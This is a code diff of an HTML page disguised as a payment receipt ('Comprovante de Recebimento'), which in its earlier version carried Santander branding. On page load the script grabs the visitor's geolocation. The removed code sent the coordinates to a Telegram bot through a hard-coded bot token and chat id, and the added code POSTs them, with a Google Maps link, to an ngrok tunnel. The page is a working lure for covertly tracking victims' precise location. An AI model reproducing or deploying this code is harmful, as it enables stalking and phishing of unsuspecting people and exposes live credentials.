@@ -4,12 +4,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento - Santander</title>
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
 </head>
 
 <body>
   <div class="comprovante-container">
-    <h1>Comprovante de Recebimento - Santander</h1>
+    <h1>Comprovante de Recebimento</h1>
 
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
@@ -24,10 +25,18 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
+
   </div>
 
   <script>
-    // Exibe a data atual
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
+
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
@@ -37,46 +46,34 @@
 
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    // Função para obter localização precisa com Geolocalização do navegador
-    function obterLocalizacao() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(enviarLocalizacaoParaTelegram, lidarComErro, {
-          enableHighAccuracy: true, // Habilita maior precisão
-          timeout: 5000,             // Timeout para obter a localização
-          maximumAge: 0             // Não utilizar dados antigos
-        });
-      } else {
-        alert("Geolocalização não é suportada neste navegador.");
-      }
-    }
+    console.log(dataAtual)
 
-    // Função para lidar com sucesso ao obter localização
-    function enviarLocalizacaoParaTelegram(position) {
+    function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      // Defina o token do bot e o chat_id
-      const botToken = '7757093107:AAHFmLastbU0lkV5f2AdeiNXHoxckQsJVy4';
-      const chatId = '1276935257';
-
-      // Envia a localização para o bot do Telegram
-      fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
+      fetch("https://15ac-189-110-251-56.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
         .then(response => response.json())
         .then(data => {
-          console.log('Localização precisa enviada para o Telegram:', data);
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
         })
         .catch(error => {
-          console.error('Erro ao enviar localização para o Telegram:', error);
+          console.error("Erro:", error);
         });
     }
 
-    // Função para lidar com erro ao obter localização
-    function lidarComErro(error) {
+    function handleError(error) {
       alert("Erro ao obter a localização: " + error.message);
     }
-
-    // Obter a localização precisa quando a página carregar
-    window.onload = obterLocalizacao;
   </script>
 </body>
 
